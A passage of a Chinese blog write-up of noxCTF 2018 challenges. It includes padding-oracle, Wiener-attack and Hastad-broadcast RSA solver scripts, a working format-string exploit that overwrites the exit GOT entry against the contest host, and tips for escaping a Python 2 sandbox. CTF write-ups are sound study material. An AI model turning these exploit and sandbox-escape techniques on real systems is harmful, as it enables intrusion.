+<p>不要用socket模块，非常慢，pwntools使用体验极佳。</p>
+<h2 id="java-corporation"><a href="#java-corporation" class="headerlink" title="java_corporation"></a>java_corporation</h2><p>padding orcle<br>可以用<a href="https://github.com/mwielgoszewski/python-paddingoracle" target="_blank" rel="noopener">https://github.com/mwielgoszewski/python-paddingoracle</a><br>需要重写下PadBuster()方法。</p>
+<p>exp.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'chal.noxale.com'</span>, <span class="number">3141</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'Encrypted.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">iv = data[:<span class="number">16</span>]</span><br><span class="line">cipher = data[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PadBuster</span><span class="params">(PaddingOracle)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">        super(PadBuster, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(self, data, **kwargs)</span>:</span></span><br><span class="line">        r.send(bytes(<span class="number">48</span>))</span><br><span class="line">        r.send(iv+data)</span><br><span class="line">        <span class="keyword">if</span> r.recv(<span class="number">1</span>) == <span class="string">'0'</span>:</span><br><span class="line">            <span class="keyword">raise</span> BadPaddingException</span><br><span class="line"></span><br><span class="line">padbuster = PadBuster()</span><br><span class="line">value = padbuster.decrypt(cipher, block_size=<span class="number">16</span>, iv=iv)</span><br><span class="line">print(<span class="string">'Decrypted: %r'</span> % (value))</span><br></pre></td></tr></table></figure></p>
+<h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h2><p>想到是leet了，也想到是wiener attack了，找的网站解leet解的不对…<br>fuck！<br>贴上别人的脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="string">'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg'</span></span><br><span class="line"></span><br><span class="line">e = <span class="string">'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT'</span></span><br><span class="line"></span><br><span class="line">c = <span class="string">'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb'</span></span><br><span class="line"></span><br><span class="line">lookup = [<span class="string">'O'</span>, <span class="string">'l'</span>, <span class="string">'Z'</span>, <span class="string">'E'</span>, <span class="string">'A'</span>, <span class="string">'S'</span>, <span class="string">'b'</span>, <span class="string">'T'</span>, <span class="string">'B'</span>, <span class="string">'g'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(x)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> x:</span><br><span class="line">        ans += str(lookup.index(c))</span><br><span class="line">    <span class="keyword">return</span> int(ans)</span><br><span class="line"></span><br><span class="line">n = decode(n)</span><br><span class="line">e = decode(e)</span><br><span class="line">c = decode(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cf_expansion</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    e = []</span><br><span class="line"></span><br><span class="line">    q = n // d</span><br><span class="line">    r = n % d</span><br><span class="line">    e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">        n, d = d, r</span><br><span class="line">        q = n // d</span><br><span class="line">        r = n % d</span><br><span class="line">        e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents</span><span class="params">(e)</span>:</span></span><br><span class="line">    n = [] <span class="comment"># Nominators</span></span><br><span class="line">    d = [] <span class="comment"># Denominators</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            ni = e[i]</span><br><span class="line">            di = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            ni = e[i]*e[i<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">            di = e[i]</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># i &gt; 1</span></span><br><span class="line">            ni = e[i]*n[i<span class="number">-1</span>] + n[i<span class="number">-2</span>]</span><br><span class="line">            di = e[i]*d[i<span class="number">-1</span>] + d[i<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">        n.append(ni)</span><br><span class="line">        d.append(di)</span><br><span class="line">        <span class="keyword">yield</span> (ni, di)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(b, c)</span>:</span></span><br><span class="line">    k = b * b - <span class="number">4</span> * <span class="number">1</span> * c</span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line">    sk, complete = gmpy2.iroot(k, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> complete: <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">return</span> [int((-b + sk) // <span class="number">2</span>), int((-b - sk) // <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    kd = convergents(cf_expansion(e, n))</span><br><span class="line">    <span class="keyword">for</span> i, (k, d) <span class="keyword">in</span> enumerate(kd):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        roots = solve(phi - n - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> len(roots) == <span class="number">2</span>:</span><br><span class="line">            p, q = roots</span><br><span class="line">            <span class="keyword">if</span> p * q == n:</span><br><span class="line">                <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = wiener(e, n)</span><br><span class="line"></span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, r)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure></p>
+<h2 id="Trinity"><a href="#Trinity" class="headerlink" title="Trinity"></a>Trinity</h2><p>五进制真没注意到。<br>crypto_commons: <a href="https://github.com/p4-team/crypto-commons" target="_blank" rel="noopener">https://github.com/p4-team/crypto-commons</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto_commons.rsa.rsa_commons <span class="keyword">import</span> hastad_broadcast</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="string">"331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004"</span></span><br><span class="line">c1 = <span class="string">"310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243"</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="string">"302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114"</span></span><br><span class="line">c2 = <span class="string">"112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344"</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="string">"332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323"</span></span><br><span class="line">c3 = <span class="string">"10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242"</span></span><br><span class="line"></span><br><span class="line">n1 = int(n1, <span class="number">5</span>)</span><br><span class="line">n2 = int(n2, <span class="number">5</span>)</span><br><span class="line">n3 = int(n3, <span class="number">5</span>)</span><br><span class="line">c1 = int(c1, <span class="number">5</span>)</span><br><span class="line">c2 = int(c2, <span class="number">5</span>)</span><br><span class="line">c3 = int(c3, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(hastad_broadcast([(c1, n1), (c2, n2), (c3, n3)])))</span><br></pre></td></tr></table></figure></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="believeMe-SOLVED-DF-11A"><a href="#believeMe-SOLVED-DF-11A" class="headerlink" title="believeMe | SOLVED | DF-11A"></a>believeMe | SOLVED | DF-11A</h2><pre><code>格式化字符串漏洞，无ASLR，栈上地址固定。
+</code></pre><h2 id="The-Name-Calculator-SOLVED-DF-11A"><a href="#The-Name-Calculator-SOLVED-DF-11A" class="headerlink" title="The Name Calculator | SOLVED | DF-11A"></a>The Name Calculator | SOLVED | DF-11A</h2><pre><code>又是格式化字符串漏洞，最后覆盖了exit函数的got表。
+中间有个xor编码的过程，需要写个对应的解码（与编码一样流程）
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">IP = <span class="string">"chal.noxale.com"</span></span><br><span class="line">PORT = <span class="number">5678</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'critical'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context(os='linux',arch='amd64')</span></span><br><span class="line">mode = args[<span class="string">'MODE'</span>].lower()</span><br><span class="line">binary = <span class="string">"./TheNameCalculator"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"remote"</span>:</span><br><span class="line">    context.noptrace = <span class="keyword">True</span></span><br><span class="line">    io = remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"></span><br><span class="line">rand = <span class="number">111458341</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvline()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"A"</span>*<span class="number">0x1c</span> + p32(rand)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">'''</span></span><br><span class="line"><span class="string">b *0x08048625</span></span><br><span class="line"><span class="string">b *0x080486D5</span></span><br><span class="line"><span class="string">b *0x080487C2</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">the_exit = <span class="number">0x0804A024</span></span><br><span class="line">supersecret = <span class="number">0x08048596</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    xor_chr = <span class="number">0x5F7B4153</span></span><br><span class="line">    <span class="keyword">if</span> len(payload) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Payload is not the multiple 4!"</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>):</span><br><span class="line">        res = <span class="string">""</span></span><br><span class="line">        orig = u32(payload[i:i+<span class="number">4</span>])</span><br><span class="line">        res = p32(orig ^ xor_chr)</span><br><span class="line">        payload = payload[<span class="number">0</span>:i] + res + payload[i+<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">        </span><br><span class="line">payload2_orig = p32(<span class="number">0x0804A024</span>) + <span class="string">"%34194c"</span> + <span class="string">"%12$hn"</span></span><br><span class="line">payload2_orig = payload2_orig.ljust(<span class="number">28</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = encode(payload2_orig)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Smooth-snake"><a href="#Smooth-snake" class="headerlink" title="Smooth snake"></a>Smooth snake</h2><p>没想到leet=1337是智商下线…后面绕沙盒有点东西。<br>收获2个绕python2沙盒的小技巧:<br>change . to getattr, and _ to dir(0)[0][0]<br><a href="https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Smooth-snake" target="_blank" rel="noopener">https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Smooth-snake</a></p>
+<h2 id="dont-look-inside-the-box"><a href="#dont-look-inside-the-box" class="headerlink" title="dont-look-inside-the-box"></a>dont-look-inside-the-box</h2><p>修复sqlite3文件头+脑洞+python操作sqlite3数据库<br><a href="https://github.com/Ar1k14001/dont-look-inside-the-box-writeup" target="_blank" rel="noopener">https://github.com/Ar1k14001/dont-look-inside-the-box-writeup</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: n3k0
+            
+            <p>发表日期: <a href="https://kuraraneko.github.io/2018/09/07/noxCTF-2018-writeup/">September 7th 2018, 10:10:54</a>
+            <p>发出嘶吼: 没有魔夜2玩我要死了</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/09/10/Python-Sandbox-Excape/" title= Python Sandbox Excape >
+                    <div class="nextTitle">Python Sandbox Excape</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/09/06/python-Debug命令执行/" title= python Debug命令执行 >
+                    <div class="prevTitle">python Debug命令执行</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zNjQ3Ni8xMzAxMQ==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:3412260756@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/intro/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/intro/qq.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        el psy congroo
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-for-fun"><span class="toc-number">1.1.</span> <span class="toc-text"><a href="#Python-for-fun" class="headerlink" title="Python for fun"></a>Python for fun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-for-fun-2"><span class="toc-number">1.2.</span> <span class="toc-text"><a href="#Python-for-fun-2" class="headerlink" title="Python for fun 2"></a>Python for fun 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Date"><span class="toc-number">1.3.</span> <span class="toc-text"><a href="#Blind-Date" class="headerlink" title="Blind Date"></a>Blind Date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Read-Between-The-Lines"><span class="toc-number">1.4.</span> <span class="toc-text"><a href="#Read-Between-The-Lines" class="headerlink" title="Read Between The Lines"></a>Read Between The Lines</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Slippery-Situation"><span class="toc-number">1.5.</span> <span class="toc-text"><a href="#Slippery-Situation" class="headerlink" title="Slippery Situation"></a>Slippery Situation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Marcode"><span class="toc-number">1.6.</span> <span class="toc-text"><a href="#Marcode" class="headerlink" title="Marcode"></a>Marcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.1.</span> <span class="toc-text"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyFileUploader"><span class="toc-number">2.2.</span> <span class="toc-text"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hiddenDOM"><span class="toc-number">2.3.</span> <span class="toc-text"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dictionary-of-obscure-sorrows"><span class="toc-number">2.4.</span> <span class="toc-text"><a href="#Dictionary-of-obscure-sorrows" class="headerlink" title="Dictionary of obscure sorrows"></a>Dictionary of obscure sorrows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PSRF"><span class="toc-number">2.5.</span> <span class="toc-text"><a href="#PSRF" class="headerlink" title="PSRF"></a>PSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chop-Suey"><span class="toc-number">3.1.</span> <span class="toc-text"><a href="#Chop-Suey" class="headerlink" title="Chop Suey"></a>Chop Suey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Decryptor"><span class="toc-number">3.2.</span> <span class="toc-text"><a href="#Decryptor" class="headerlink" title="Decryptor"></a>Decryptor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Plot-Twist"><span class="toc-number">3.3.</span> <span class="toc-text"><a href="#Plot-Twist" class="headerlink" title="Plot-Twist"></a>Plot-Twist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java-corporation"><span class="toc-number">3.4.</span> <span class="toc-text"><a href="#java-corporation" class="headerlink" title="java_corporation"></a>java_corporation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WTF"><span class="toc-number">3.5.</span> <span class="toc-text"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trinity"><span class="toc-number">3.6.</span> <span class="toc-text"><a href="#Trinity" class="headerlink" title="Trinity"></a>Trinity</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#believeMe-SOLVED-DF-11A"><span class="toc-number">4.1.</span> <span class="toc-text"><a href="#believeMe-SOLVED-DF-11A" class="headerlink" title="believeMe | SOLVED | DF-11A"></a>believeMe | SOLVED | DF-11A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Name-Calculator-SOLVED-DF-11A"><span class="toc-number">4.2.</span> <span class="toc-text"><a href="#The-Name-Calculator-SOLVED-DF-11A" class="headerlink" title="The Name Calculator | SOLVED | DF-11A"></a>The Name Calculator | SOLVED | DF-11A</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">5.</span> <span class="toc-text"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Smooth-snake"><span class="toc-number">5.1.</span> <span class="toc-text"><a href="#Smooth-snake" class="headerlink" title="Smooth snake"></a>Smooth snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dont-look-inside-the-box"><span class="toc-number">5.2.</span> <span class="toc-text"><a href="#dont-look-inside-the-box" class="headerlink" title="dont-look-inside-the-box"></a>dont-look-inside-the-box</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
